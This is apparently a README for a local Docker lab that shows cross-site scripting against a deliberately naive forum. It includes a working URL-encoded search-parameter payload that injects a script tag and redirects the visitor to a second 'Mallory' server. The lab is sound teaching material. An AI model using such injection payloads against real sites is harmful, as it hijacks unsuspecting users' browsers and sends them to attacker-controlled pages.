# Reflected XSS

Here you have a minimal working example of a *DOM based XSS* attack.
It follows the same principle of the reflected-XSS, but everything happens at client side.

## See it in action

This will bring up the two servers. The naive forum (port 8080) and the malicious Mallory server (port 8081).
```
docker-compose build; docker-compose up -d
```
To see the search result
```
http://localhost:8080/search/?terms=SOMETHING
```
You can search anything and you will be redirect to the search result page.
However, check out what happens if you follow the carefully crafted Mallory link.
It seems that it is just linking you to a naive-server research page
```
http://localhost:8080/search/?terms=%3C%2Fdiv%3E%3Cscript%3Edocument.location%3D%22http%3A%2F%2Flocalhost%3A8081%2F%22%3C%2Fscript%3E%3Cdiv%3E
```
Hey, you have been redirected against your will!

